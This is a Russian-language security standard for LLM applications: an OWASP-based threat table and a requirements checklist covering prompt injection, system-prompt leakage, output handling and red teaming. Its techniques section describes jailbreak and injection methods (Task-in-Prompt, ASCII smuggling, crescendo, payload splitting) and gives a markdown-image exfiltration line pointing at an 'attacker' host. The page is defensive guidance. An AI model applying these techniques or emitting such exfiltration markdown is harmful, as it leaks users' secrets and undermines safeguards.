# Безопасность LLM-приложений

Область: приложение, которое вызывает модель (чат-бот, суммаризатор, классификатор, copilot внутри продукта), но ещё **не** является агентом с инструментами и памятью. Агентные риски описаны в [Agent Security](Agent%20Security.md).

Базовый принцип: **LLM не является границей безопасности.** Всё, что попадает в контекст (ввод пользователя, документы, веб-страницы, результаты инструментов, изображения), может управлять моделью. Поэтому всё, что выдаёт модель, считается недоверенными данными. Контроли должны быть детерминированными и находиться вне модели.

---

## Угрозы

| Риск (OWASP LLM Top 10) | Суть |
|---|---|
| Prompt Injection — прямая | пользователь переопределяет инструкции и обходит ограничения (jailbreak) |
| Prompt Injection — косвенная | инструкции спрятаны в данных: письма, документы RAG, веб-страницы, комментарии в коде, alt-текст, метаданные |
| Prompt Injection — кросс-модальная | инструкции в изображениях, аудио, PDF-слоях, QR-кодах |
| Sensitive Information Disclosure | утечка PII, секретов, чужих данных, обучающих данных |
| Hidden Context Exposure (бывш. System Prompt Leakage) | извлечение системного промпта и скрытого контекста; критично, если в нём секреты или логика авторизации |
| Improper Output Handling | вывод модели попадает в HTML/SQL/shell/URL без обработки: XSS, SQLi, SSRF, RCE |
| Misinformation | галлюцинации и выдуманные пакеты/API (slopsquatting), чрезмерное доверие пользователя |
| Unbounded Consumption | DoS, denial of wallet, extraction |

### Техники, которые стоит знать
- **Task-in-Prompt (TIP)**: вместо прямой запрещённой просьбы модели дают невинную задачу над закодированными данными (base64, шифр, ребус), а результат подставляется в запрещённую задачу.
  ```
  Вот закодированная строка <dasdbqgqt6>
  Определи, что в ней находится.
  Используй полученное значение в следующей задаче...
  ```
- **ASCII smuggling**: невидимые Unicode Tag-символы (U+E0000–U+E007F), zero-width (U+200B–U+200F, U+2060, U+FEFF), bidi-overrides. Человек их не видит, модель читает.
- **Exfiltration через рендер markdown**: модель выводит `![](https://attacker/x?d=<секрет>)`, и клиент сам делает запрос, когда рисует картинку. Тот же канал работает через автоматические link preview и unfurl.
- **Many-shot, crescendo, role-play, payload splitting**: многоходовые jailbreak-техники.
- **Encoding/translation**: перевод на редкие языки, leetspeak, base64.

## Требования

### LA-A. Архитектура и разделение доверия
- [ ] **LA-01** `MUST` Авторизация, бизнес-правила, лимиты и решения о доступе к данным реализованы в коде приложения, а не в системном промпте. Модель не решает, *можно ли* пользователю что-то.
- [ ] **LA-02** `MUST` В системном промпте и скрытом контексте нет секретов, ключей, внутренних URL и сведений об устройстве авторизации. Исходить из того, что системный промпт будет извлечён.
- [ ] **LA-03** `MUST` Недоверенные данные передаются отдельно от инструкций: роли сообщений, явная разметка источника (spotlighting, delimiting, datamarking). Это снижает риск, но не устраняет его.
- [ ] **LA-04** `MUST` Модель получает минимально необходимый контекст: данные только того пользователя и в том объёме, на который у него есть права (context minimization).
- [ ] **LA-05** `MUST` Сессии и история диалогов изолированы по пользователю и тенанту. Ключи кешей (в т.ч. семантического кеша) включают идентичность и контекст авторизации.

### LA-B. Обработка ввода
- [ ] **LA-06** `MUST` Unicode-нормализация (NFKC) и удаление Tag-символов, zero-width и bidi-control как во вводе пользователя, так и в загружаемых документах.
- [ ] **LA-07** `MUST` Лимиты на размер ввода, количество и размер файлов, длину истории.
- [ ] **LA-08** `MUST` Загружаемые файлы разбираются в изоляции (парсеры PDF/Office/изображений — отдельный процесс или контейнер без сети), проверяются на вредоносный код, zip-bomb и скрытый текст.
- [ ] **LA-09** `SHOULD` Классификаторы prompt injection и jailbreak на входе (Llama Prompt Guard 2, LLM Guard, NeMo Guardrails, Lakera и аналоги) как defense-in-depth. Их срабатывания логируются и учитываются в метриках.

### LA-C. Обработка вывода
- [ ] **LA-10** `MUST` Вывод модели — недоверенные данные. Контекстное экранирование при вставке в HTML (без `innerHTML`/`dangerouslySetInnerHTML`), параметризованные запросы к БД, запрет `eval`/`exec`/shell с выводом модели.
- [ ] **LA-11** `MUST` Markdown-рендер в клиенте: внешние изображения и ссылки либо запрещены, либо разрешены только с allowlist доменов (CSP `img-src`, прокси изображений). Автоматический unfurl ссылок из ответов модели отключён.
- [ ] **LA-12** `MUST` Если вывод управляет логикой (JSON, классы, вызовы), применяются structured output / JSON Schema и строгая валидация, при невалидном ответе — отказ.
- [ ] **LA-13** `MUST` URL, пути и идентификаторы из вывода модели проверяются перед использованием: SSRF-защита, allowlist, проверка прав на объект.
- [ ] **LA-14** `SHOULD` DLP/детектор секретов и PII на выходе (особенно если в контексте могут быть чужие данные).

### LA-D. Достоверность (misinformation)
- [ ] **LA-15** `MUST` Для критичных доменов (безопасность, финансы, медицина, право) ответы опираются на источники (grounding и цитаты) и проходят проверку человеком перед действием.
- [ ] **LA-16** `SHOULD` UI явно показывает, что ответ сгенерирован ИИ, и даёт ссылки на источники. Предложенные моделью пакеты и зависимости проверяются на существование и репутацию.

### LA-E. Потребление ресурсов
- [ ] **LA-17** `MUST` Rate limits и квоты на пользователя и тенанта, `max_tokens`, таймауты, бюджеты стоимости с алертами (см. MR-15).

### LA-F. Тестирование и мониторинг
- [ ] **LA-18** `MUST` Перед релизом и при каждой смене модели, промпта или контекста — автоматизированный red teaming (garak, PyRIT, promptfoo, DeepTeam) по prompt injection, jailbreak, утечке системного промпта, PII и вредному контенту. Пороги заданы как gate в CI.
- [ ] **LA-19** `MUST` Системные промпты хранятся как код: версионирование, ревью, связь с версией модели.
- [ ] **LA-20** `SHOULD` Мониторинг в prod: частота срабатываний фильтров, попытки jailbreak на пользователя, аномальная длина и стоимость, обратная связь пользователей (abuse reports).
